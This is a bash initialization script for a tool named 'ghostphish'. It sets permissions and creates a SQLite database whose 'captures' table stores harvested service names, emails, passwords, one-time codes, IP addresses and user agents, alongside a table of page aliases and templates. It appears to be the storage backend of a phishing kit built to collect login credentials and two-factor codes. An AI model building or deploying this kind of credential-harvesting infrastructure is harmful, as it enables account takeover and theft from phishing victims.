#!/bin/bash
# Initialize ghostphish with proper permissions

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DATA_DIR="${SCRIPT_DIR}/data"

echo "[*] Initializing ghostphish data directory..."

# Create data directory with proper permissions
mkdir -p "$DATA_DIR"
chmod 755 "$DATA_DIR"

# Ensure .gitkeep exists
touch "$DATA_DIR/.gitkeep"

# Set permissions for Docker/Termux compatibility
if [ -f "$DATA_DIR/captures.db" ]; then
    chmod 666 "$DATA_DIR/captures.db" 2>/dev/null || true
fi

# Create initial database
python3 << EOF
import sqlite3
import os
from datetime import datetime

db_path = "$DATA_DIR/captures.db"
print(f"[*] Creating database at: {db_path}")

try:
    conn = sqlite3.connect(db_path, timeout=5)
    conn.execute("PRAGMA journal_mode=WAL")
    c = conn.cursor()

    c.execute('''
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            service TEXT,
            email TEXT,
            password TEXT,
            otp TEXT,
            honeypot TEXT,
            ip_address TEXT,
            user_agent TEXT,
            referer TEXT,
            attempt_number INTEGER
        )
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS aliases (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            path TEXT UNIQUE,
            template TEXT,
            created_at TEXT
        )
    ''')

    conn.commit()
    conn.close()
    print("[+] Database initialized successfully!")

    # Ensure writable
    os.chmod(db_path, 0o666)

except Exception as e:
    print(f"[!] Error: {e}")
    exit(1)
EOF

echo "[+] Ghostphish initialized successfully!"
